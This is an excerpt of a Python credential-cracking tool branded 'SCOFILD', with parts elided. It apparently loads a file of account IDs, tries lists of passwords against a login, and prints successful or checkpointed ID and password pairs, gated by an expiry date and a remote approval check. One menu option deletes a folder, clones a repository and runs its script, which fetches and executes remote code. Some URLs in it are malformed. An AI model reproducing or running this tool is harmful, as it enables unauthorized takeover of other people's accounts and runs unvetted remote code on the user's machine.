...
date = '12/29/2023, 02:00:00'
if date <= minn:
    print("Toolaka ragera agadarm bkanawa ! user NATAWE ")
    exit()
...
\33[1;36m                   ꧁༒𝐒𝐂𝐎𝐅𝐈𝐋𝐃༒꧂
                                     updet by ꧁༒𝐒𝐂𝐎𝐅𝐈𝐋𝐃༒꧂💀
\33[1;37m--------------------------------------------
 \033[1;31m[\033[1;32m•\033[1;31m]\033[1;36m DEVELOPER :   ꧁༒𝐒𝐂𝐎𝐅𝐈𝐋𝐃༒꧂
 \033[1;31m[\033[1;32m•\033[1;31m]\033[1;36m TOOLS     :   FILE & ONLY  VIP⛄
 \033[1;31m[\033[1;32m•\033[1;31m]\033[1;36m GITHUB    :   TOOL VIP ꧁༒𝐒𝐂𝐎𝐅𝐈𝐋𝐃༒꧂
 \033[1;31m[\033[1;32m•\033[1;31m]\033[1;36m VERSION   :   0.9
 \033[1;31m[\033[1;32m•\033[1;31m]\033[1;36m WHATSAPP  :   NONE✖️
\33[1;37m--------------------------------------------""")
def linex():
	print('\033[1;37m--------------------------------------------')
...
def menu():
	...
	if me in ["1", "01"]:
		...
		os.system('rm -rf Control-Room && git clone httpshttps://github.comBALEN-404/Control-Room && cd Control-Room && python ran.py ')
...
class D:
	...
	def plerr(self):
		...
		banner()
		try:
			fileX = input ('\033[1;31m[\033[1;32m?\033[1;31m]\033[1;38m ENTER YOUR FILE : ') 
			for line in open(fileX, 'r').readlines():
				id.append(line.strip())
			print(f'\033[1;31m[\033[1;32m•\033[1;31m]\033[1;32mIDZ : \x1b[1;92m'+str(len(id)))
			Settings()
		except IOError:
			print("\033[1;31m[\033[1;31m!\033[1;31m]\033[1;31mFILE %s NOT FOUND\x1b[0m"%(fileX));time.sleep(2)
			F()
			
def Settings():
	os.system("clear");banner()
	print(f'\033[1;95m[\033[1;35m1\033[1;95m]\033[0;95m STRAT CRACK')
	hu = input('\033[1;33m[\033[1;33m?\033[1;33m]\033[1;33mCHOOSE :\x1b[1;93m ')
	if hu in ['0','00']:
		muda=[]
	...
	hc = input('\033[1;33m[\033[1;33m?\033[1;33m]\033[1;33mCHOOSE :\x1b[1;93m ')
	if hc in ['1','01']:
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo} [SCOFILD🤌🥷] {h}{loop}|{len(id)} | OK:-{h}{ok} ")
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r \x1b[\x1b[1;91mS҉C҉O҉F҉I҉L҉D҉-CP] {idf} | {pw}')     
				...
				print(f'\r\r\x1b[38;5;46m[꧁༒𝐒𝐂𝐎𝐅𝐈𝐋𝐃༒꧂☠-OK] '+idf+ ' | '+pw+'')
...
def approval():
  ...
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https:/BALEN404.blogspot.com/2023/05/approved.html').text
    if id in httpCaht:
